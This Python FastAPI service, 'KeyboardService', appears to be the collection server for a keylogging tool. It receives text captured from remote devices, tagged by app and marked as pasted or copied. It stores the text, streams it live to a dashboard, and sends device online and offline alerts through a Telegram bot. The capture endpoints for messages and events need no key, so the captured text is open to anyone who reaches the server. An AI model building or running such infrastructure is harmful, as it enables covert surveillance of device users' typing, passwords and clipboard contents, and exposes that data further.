import asyncio
import html
import json
import os
import time
import urllib.parse
import urllib.request
from urllib.error import HTTPError
from contextlib import asynccontextmanager
from collections import deque
from pathlib import Path
from typing import Deque, Dict

from fastapi import FastAPI, Header, Request
from fastapi.responses import FileResponse, JSONResponse, StreamingResponse
from pydantic import BaseModel
import psycopg

MAX_MESSAGES = 200
BASE_DIR = Path(__file__).resolve().parent
LOG_PATH = BASE_DIR / "text.txt"
HTML_PATH = BASE_DIR / "index.html"
messages: Deque[Dict[str, object]] = deque(maxlen=MAX_MESSAGES)
devices: Dict[str, Dict[str, object]] = {}
device_online_states: Dict[str, bool] = {}
DATABASE_URL = os.getenv("DATABASE_URL", "").strip()
SERVICE_STARTED_AT = time.time()
DEVICE_HEARTBEAT_INTERVAL = 30
DEVICE_OFFLINE_AFTER = 90
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "").strip()
BUY_ME_A_COFFEE_URL = os.getenv(
    "BUY_ME_A_COFFEE_URL", "https://buymeacoffee.com/yourusername"
).strip()
TELEGRAM_UPTIME_INTERVAL = max(
    60, int(os.getenv("TELEGRAM_UPTIME_INTERVAL_SECONDS", "900"))
)


def telegram_configured():
    return bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)


def parse_support_methods(value):
    if value.startswith(("http://", "https://")):
        return []

    methods = []
    for entry in value.replace("\n", ";").split(";"):
        if "=" not in entry:
            continue
        name, payment_value = entry.split("=", 1)
        name = name.strip()
        payment_value = payment_value.strip()
        if name and payment_value:
            methods.append({"name": name, "value": payment_value})
    return methods


SUPPORT_METHODS = parse_support_methods(BUY_ME_A_COFFEE_URL)


def telegram_api_request(method, values, timeout=10):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/{method}"
    payload = urllib.parse.urlencode(values).encode("utf-8")
    request = urllib.request.Request(url, data=payload, method="POST")
    with urllib.request.urlopen(request, timeout=timeout) as response:
        if response.status >= 400:
            raise RuntimeError(f"Telegram HTTP {response.status}")
        return json.loads(response.read().decode("utf-8"))


def send_telegram_message(text, parse_mode=None):
    if not telegram_configured():
        return

    try:
        values = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
        if parse_mode:
            values["parse_mode"] = parse_mode
        telegram_api_request("sendMessage", values)
    except Exception as error:
        print(f"Could not send Telegram uptime notification: {error}")


def format_uptime(seconds):
    days, remainder = divmod(max(0, int(seconds)), 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    parts = []
    if days:
        parts.append(f"{days}d")
    if hours or days:
        parts.append(f"{hours}h")
    if minutes or hours or days:
        parts.append(f"{minutes}m")
    parts.append(f"{seconds}s")
    return " ".join(parts)


def telegram_uptime_text():
    return (
        "<b>KeyboardService</b>\n"
        "🟢 <b>Status:</b> Healthy\n"
        f"⏱ <b>Uptime:</b> {format_uptime(time.time() - SERVICE_STARTED_AT)}\n"
        f"🗂 <b>Stored messages:</b> {len(messages)}\n"
        f"📱 <b>Known devices:</b> {len(devices)}"
    )


def telegram_devices_text():
    if not devices:
        return "<b>Connected devices</b>\n\nNo devices have checked in yet."

    now = int(time.time() * 1000)
    online_count = 0
    lines = [f"<b>Connected devices</b> ({len(devices)})", ""]
    for device in sorted(devices.values(), key=lambda item: str(item.get("name", ""))):
        last_seen = int(device.get("last_seen", 0))
        online = now - last_seen <= DEVICE_OFFLINE_AFTER * 1000
        if online:
            online_count += 1
        status = "🟢 Online" if online else "🔴 Offline"
        age = format_uptime(max(0, (now - last_seen) // 1000))
        name = html.escape(str(device.get("name", "Unknown device")))
        device_id = html.escape(str(device.get("id", "unknown")))
        lines.append(f"{status} <b>{name}</b>\n   ID: <code>{device_id}</code>\n   Last seen: {age} ago")
    lines.insert(1, f"🟢 {online_count} online  •  🔴 {len(devices) - online_count} offline")
    return "\n".join(lines)


def telegram_messages_text():
    counts = {}
    for item in messages:
        device_name = str(item.get("device_name", "Unknown device"))
        counts[device_name] = counts.get(device_name, 0) + 1
    lines = [f"<b>Message summary</b>\n📨 Stored messages: <b>{len(messages)}</b>"]
    if counts:
        lines.append("\n<b>By device</b>")
        lines.extend(
            f"• {html.escape(name)}: {count}" for name, count in sorted(counts.items())
        )
    else:
        lines.append("\nNo messages stored.")
    return "\n".join(lines)


def telegram_help_text():
    return (
        "<b>KeyboardService Bot</b>\n\n"
        "Monitor your service and connected devices from Telegram.\n\n"
        "<b>Commands</b>\n"
        "🏠 /start - Welcome message\n"
        "📊 /status - Service health and uptime\n"
        "📱 /devices - Connected device status\n"
        "📨 /messages - Message totals by device\n"
        "💛 /support - Payment and support options\n"
        "❓ /help - Show this help"
    )


def telegram_start_text():
    return (
        "<b>Welcome to KeyboardService</b>\n\n"
        "A lightweight dashboard for your connected keyboard clients and live message service.\n\n"
        "Built by <b>Petroholic</b>.\n\n"
        "Choose an option below or use /help to view the available commands."
    )


def telegram_menu_markup():
    return {
        "keyboard": [
            ["/status", "/devices"],
            ["/messages", "/support"],
            ["/help"],
        ],
        "resize_keyboard": True,
        "is_persistent": True,
    }


def telegram_support_text():
    if SUPPORT_METHODS:
        lines = ["<b>Support KeyboardService</b>", ""]
        for method in SUPPORT_METHODS:
            name = html.escape(method["name"])
            value = html.escape(method["value"])
            lines.append(f"<b>{name}</b>\n<code>{value}</code>")
        return "\n\n".join(lines)
    return f"<b>Support KeyboardService</b>\n{html.escape(BUY_ME_A_COFFEE_URL)}"


def configure_telegram_menu():
    try:
        telegram_api_request(
            "deleteWebhook", {"drop_pending_updates": "false"}
        )
        telegram_api_request(
            "setMyCommands",
            {
                "commands": json.dumps(
                    [
                        {"command": "start", "description": "Welcome to KeyboardService"},
                        {"command": "help", "description": "Show available commands"},
                        {"command": "status", "description": "Show service health and uptime"},
                        {"command": "devices", "description": "List connected devices"},
                        {"command": "messages", "description": "Show stored message totals"},
                        {"command": "support", "description": "Show support options"},
                    ]
                )
            },
        )
    except Exception as error:
        print(f"Could not configure Telegram command menu: {error}")


def poll_telegram_commands():
    offset = None
    configure_telegram_menu()
    conflict_logged = False
    while True:
        try:
            values = {"timeout": 25}
            if offset is not None:
                values["offset"] = offset
            response = telegram_api_request("getUpdates", values, timeout=35)
            for update in response.get("result", []):
                offset = int(update["update_id"]) + 1
                message = update.get("message", {})
                chat = message.get("chat", {})
                text = (message.get("text") or "").strip().lower()
                if str(chat.get("id")) != TELEGRAM_CHAT_ID:
                    continue
                command = text.split()[0] if text else ""
                command = command.split("@", 1)[0]
                reply = None
                if command == "/start":
                    reply = telegram_start_text()
                elif command == "/help":
                    reply = telegram_help_text()
                elif command in {"/uptime", "/status"}:
                    reply = telegram_uptime_text()
                elif command == "/devices":
                    reply = telegram_devices_text()
                elif command == "/messages":
                    reply = telegram_messages_text()
                elif command in {"/support", "/buymeacoffee"}:
                    reply = telegram_support_text()
                if reply:
                    telegram_api_request(
                        "sendMessage",
                        {
                            "chat_id": TELEGRAM_CHAT_ID,
                            "text": reply,
                            "parse_mode": "HTML",
                            "reply_markup": json.dumps(telegram_menu_markup()),
                        },
                    )
        except HTTPError as error:
            if error.code == 409:
                if not conflict_logged:
                    print(
                        "Telegram command polling is already active elsewhere; "
                        "stop the other bot process to enable /buymeacoffee."
                    )
                    conflict_logged = True
                time.sleep(30)
                continue
            print(f"Could not process Telegram commands: {error}")
            time.sleep(5)
        except Exception as error:
            print(f"Could not process Telegram commands: {error}")
            time.sleep(5)


def notify_device_status(device_id, device_name, online):
    status = "online" if online else "offline"
    send_telegram_message(
        f"Device {status}: {device_name} ({device_id})"
    )


async def device_status_loop():
    while True:
        await asyncio.sleep(DEVICE_HEARTBEAT_INTERVAL)
        now = int(time.time() * 1000)
        for device in list(devices.values()):
            device_id = str(device["id"])
            last_seen = int(device.get("last_seen", 0))
            online = now - last_seen <= DEVICE_OFFLINE_AFTER * 1000
            previous = device_online_states.get(device_id)
            device_online_states[device_id] = online
            if previous is True and not online:
                await asyncio.to_thread(
                    notify_device_status,
                    device_id,
                    device.get("name", "Unknown device"),
                    False,
                )


async def telegram_uptime_loop():
    await asyncio.to_thread(
        send_telegram_message,
        "KeyboardService is online. Built by Petroholic.",
    )
    while True:
        await asyncio.sleep(TELEGRAM_UPTIME_INTERVAL)
        await asyncio.to_thread(
            send_telegram_message,
            f"KeyboardService heartbeat: healthy for {int(time.time() - SERVICE_STARTED_AT)} seconds.",
        )


@asynccontextmanager
async def lifespan(_app):
    heartbeat_task = None
    telegram_command_task = None
    device_status_task = asyncio.create_task(device_status_loop())
    if telegram_configured():
        heartbeat_task = asyncio.create_task(telegram_uptime_loop())
        telegram_command_task = asyncio.create_task(
            asyncio.to_thread(poll_telegram_commands)
        )
    elif TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID:
        print("Telegram uptime notifications need both TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID")

    try:
        yield
    finally:
        tasks = [device_status_task]
        if heartbeat_task:
            tasks.append(heartbeat_task)
        if telegram_command_task:
            telegram_command_task.cancel()
            tasks.append(telegram_command_task)
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)


def load_file_messages():
    try:
        with LOG_PATH.open("r", encoding="utf-8") as f:
            lines = [line.strip() for line in f.read().splitlines() if line.strip()]
    except FileNotFoundError:
        return []

    parsed = []
    for line in lines:
        if "|" not in line:
            continue
        parts = line.split("|", 5)
        try:
            if len(parts) == 2:
                ts, text = parts
                device_id = "unknown"
                device_name = "Unknown device"
                is_pasted = False
                is_copied = False
            elif len(parts) == 5:
                ts, device_id, device_name, pasted_value, text = parts
                is_pasted = pasted_value == "1"
                is_copied = False
            elif len(parts) == 6:
                ts, device_id, device_name, pasted_value, copied_value, text = parts
                is_pasted = pasted_value == "1"
                is_copied = copied_value == "1"
            else:
                ts, device_id, device_name, text = parts
                is_pasted = False
                is_copied = False
            parsed.append(
                {
                    "id": int(ts),
                    "text": text.strip(),
                    "raw_text": text.strip(),
                    "raw_only": False,
                    "time": int(ts),
                    "device_id": device_id,
                    "device_name": device_name,
                    "app_name": "Unknown app",
                    "is_pasted": is_pasted,
                    "is_copied": is_copied,
                }
            )
        except ValueError:
            continue
    return parsed


def load_text_messages():
    global messages
    parsed = []
    if DATABASE_URL:
        try:
            with psycopg.connect(DATABASE_URL) as connection:
                with connection.cursor() as cursor:
                    cursor.execute(
                        """
                        SELECT id, text, raw_text, raw_only, device_id, device_name, app_name, time, is_pasted, is_copied
                        FROM messages
                        ORDER BY time DESC
                        LIMIT %s
                        """,
                        (MAX_MESSAGES,),
                    )
                    rows = cursor.fetchall()
            parsed = [
                {
                    "id": row[0],
                    "text": row[1],
                    "raw_text": row[2] or row[1],
                    "raw_only": row[3],
                    "device_id": row[4],
                    "device_name": row[5],
                    "app_name": row[6],
                    "time": row[7],
                    "is_pasted": row[8],
                    "is_copied": row[9],
                }
                for row in reversed(rows)
            ]
        except Exception as error:
            print(f"Could not load Supabase messages: {error}")

    if not parsed:
        parsed = load_file_messages()
    messages = deque(parsed[-MAX_MESSAGES:], maxlen=MAX_MESSAGES)
    for item in messages:
        devices[str(item["device_id"])] = {
            "id": item["device_id"],
            "name": item["device_name"],
            "last_seen": item["time"],
            "started_at": item["time"],
            "joined_at": item["time"],
        }


def load_devices():
    if not DATABASE_URL:
        return

    try:
        with psycopg.connect(DATABASE_URL) as connection:
            with connection.cursor() as cursor:
                cursor.execute(
                    """
                    SELECT device_id, device_name, last_seen, started_at, joined_at
                    FROM devices
                    ORDER BY last_seen DESC
                    """
                )
                rows = cursor.fetchall()
        for device_id, device_name, last_seen, started_at, joined_at in rows:
            devices[str(device_id)] = {
                "id": device_id,
                "name": device_name,
                "last_seen": last_seen,
                "started_at": started_at,
                "joined_at": joined_at,
            }
            device_online_states[str(device_id)] = (
                int(time.time() * 1000) - int(last_seen)
                <= DEVICE_OFFLINE_AFTER * 1000
            )
    except Exception as error:
        print(f"Could not load Supabase devices: {error}")


def save_message(item):
    if not DATABASE_URL:
        write_text_log()
        return

    with psycopg.connect(DATABASE_URL) as connection:
        with connection.cursor() as cursor:
            cursor.execute(
                """
                INSERT INTO messages (id, text, raw_text, raw_only, device_id, device_name, app_name, time, is_pasted, is_copied)
                VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
                """,
                (
                    item["id"],
                    item["text"],
                    item["raw_text"],
                    item["raw_only"],
                    item["device_id"],
                    item["device_name"],
                    item["app_name"],
                    item["time"],
                    item["is_pasted"],
                    item["is_copied"],
                ),
            )


def save_device(device_id, device_name, last_seen, started_at, joined_at):
    devices[device_id] = {
        "id": device_id,
        "name": device_name,
        "last_seen": last_seen,
        "started_at": started_at,
        "joined_at": joined_at,
    }
    if not DATABASE_URL:
        return

    with psycopg.connect(DATABASE_URL) as connection:
        with connection.cursor() as cursor:
            cursor.execute(
                """
                INSERT INTO devices (device_id, device_name, last_seen, started_at, joined_at)
                VALUES (%s, %s, %s, %s, %s)
                ON CONFLICT (device_id) DO UPDATE SET
                    device_name = EXCLUDED.device_name,
                    last_seen = EXCLUDED.last_seen,
                    started_at = EXCLUDED.started_at
                """,
                (device_id, device_name, last_seen, started_at, joined_at),
            )


def write_text_log():
    line_text = "\n".join(
        f"{int(item['time'])}|{item['device_id']}|{item['device_name']}|{1 if item.get('is_pasted') else 0}|{1 if item.get('is_copied') else 0}|{item['text']}"
        for item in list(messages)
    )
    with LOG_PATH.open("w", encoding="utf-8") as f:
        f.write(line_text)


class MessageInput(BaseModel):
    text: str
    raw_text: str = ""
    raw_only: bool = False
    device_id: str = "unknown"
    device_name: str = "Unknown device"
    app_name: str = "Unknown app"
    is_pasted: bool = False
    is_copied: bool = False


class DeviceHeartbeat(BaseModel):
    device_id: str
    device_name: str = "Unknown device"
    started_at: int


app = FastAPI(title="KeyboardService", lifespan=lifespan)
load_text_messages()
load_devices()


@app.get("/")
async def root():
    return FileResponse(HTML_PATH)


@app.get("/messages")
async def fetch_messages(device_id: str | None = None):
    selected_device_id = (device_id or "").strip()
    result = [
        item for item in messages
        if not selected_device_id or str(item.get("device_id")) == selected_device_id
    ]
    return JSONResponse(result)


@app.get("/api/config")
async def fetch_config():
    return JSONResponse({
        "buy_me_a_coffee_url": BUY_ME_A_COFFEE_URL if not SUPPORT_METHODS else "",
        "payment_methods": SUPPORT_METHODS,
    })


@app.get("/api/devices")
async def fetch_devices():
    now = int(time.time() * 1000)
    result = []
    for device in devices.values():
        last_seen = int(device.get("last_seen", 0))
        started_at = int(device.get("started_at", last_seen))
        age_seconds = max(0, (now - last_seen) // 1000)
        online = age_seconds <= DEVICE_OFFLINE_AFTER
        uptime_end = now if online else last_seen
        result.append(
            {
                **device,
                "online": online,
                "status": "Online" if online else "Offline",
                "last_seen_age_seconds": age_seconds,
                "offline_after_seconds": DEVICE_OFFLINE_AFTER,
                "uptime_seconds": max(0, (uptime_end - started_at) // 1000),
            }
        )
    return JSONResponse(result)


@app.post("/api/devices/heartbeat")
async def device_heartbeat(
    payload: DeviceHeartbeat, x_api_key: str | None = Header(default=None)
):
    expected_key = os.getenv("INGEST_API_KEY")
    if expected_key and x_api_key != expected_key:
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)

    device_id = payload.device_id.strip()
    device_name = payload.device_name.strip() or "Unknown device"
    if not device_id:
        return JSONResponse({"ok": False, "error": "missing device_id"}, status_code=400)

    now = int(time.time() * 1000)
    existing_device = devices.get(device_id, {})
    joined_at = int(existing_device.get("joined_at", now))
    was_online = device_online_states.get(device_id)
    if was_online is None and device_id in devices:
        was_online = now - int(devices[device_id].get("last_seen", 0)) <= (
            DEVICE_OFFLINE_AFTER * 1000
        )
    try:
        save_device(
            device_id,
            device_name,
            now,
            payload.started_at,
            joined_at,
        )
    except Exception as error:
        print(f"Could not save device heartbeat: {error}")
        return JSONResponse(
            {"ok": False, "error": "device storage unavailable"}, status_code=503
        )
    device_online_states[device_id] = True
    if was_online is not True:
        await asyncio.to_thread(
            notify_device_status, device_id, device_name, True
        )
    return JSONResponse({"ok": True})


@app.post("/api/messages")
async def add_message(payload: MessageInput, x_api_key: str | None = Header(default=None)):
    expected_key = os.getenv("INGEST_API_KEY")
    if expected_key and x_api_key != expected_key:
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)

    text = payload.text.strip()
    if not text:
        return JSONResponse({"ok": False, "error": "empty message"})

    now = int(time.time() * 1000)
    device_id = payload.device_id.strip() or "unknown"
    device_name = payload.device_name.strip() or "Unknown device"
    app_name = payload.app_name.strip() or "Unknown app"
    is_pasted = payload.is_pasted
    is_copied = payload.is_copied
    raw_text = payload.raw_text.strip() or text
    raw_only = payload.raw_only
    previous_device = devices.get(device_id, {})
    devices[device_id] = {
        "id": device_id,
        "name": device_name,
        "last_seen": now,
        "started_at": previous_device.get("started_at", now),
        "joined_at": previous_device.get("joined_at", now),
    }
    device_online_states[device_id] = True
    item = {
        "id": now,
        "text": text,
        "raw_text": raw_text,
        "raw_only": raw_only,
        "time": now,
        "device_id": device_id,
        "device_name": device_name,
        "app_name": app_name,
        "is_pasted": is_pasted,
        "is_copied": is_copied,
    }
    try:
        save_message(item)
    except Exception as error:
        print(f"Could not save message: {error}")
        return JSONResponse(
            {"ok": False, "error": "message storage unavailable"}, status_code=503
        )
    messages.append(item)
    return JSONResponse({"ok": True, "message": item})


@app.get("/events")
async def events(request: Request, device_id: str | None = None):
    selected_device_id = (device_id or "").strip()
    async def event_generator():
        last_seen = max((int(item["id"]) for item in messages), default=0)
        while True:
            for msg in list(messages):
                msg_id = int(msg["id"])
                if msg_id > last_seen:
                    if not selected_device_id or str(msg.get("device_id")) == selected_device_id:
                        yield f"data: {json.dumps(msg)}\n\n"
                    last_seen = msg_id
            if await request.is_disconnected():
                break
            await asyncio.sleep(0.5)

    return StreamingResponse(event_generator(), media_type="text/event-stream")


@app.get("/health")
async def health():
    return {
        "ok": True,
        "count": len(messages),
        "started_at": int(SERVICE_STARTED_AT * 1000),
        "uptime_seconds": int(time.time() - SERVICE_STARTED_AT),
    }


if __name__ == "__main__":
    import uvicorn

    port = int(os.getenv("PORT", "8000"))
    uvicorn.run("app:app", host="0.0.0.0", port=port, reload=False)
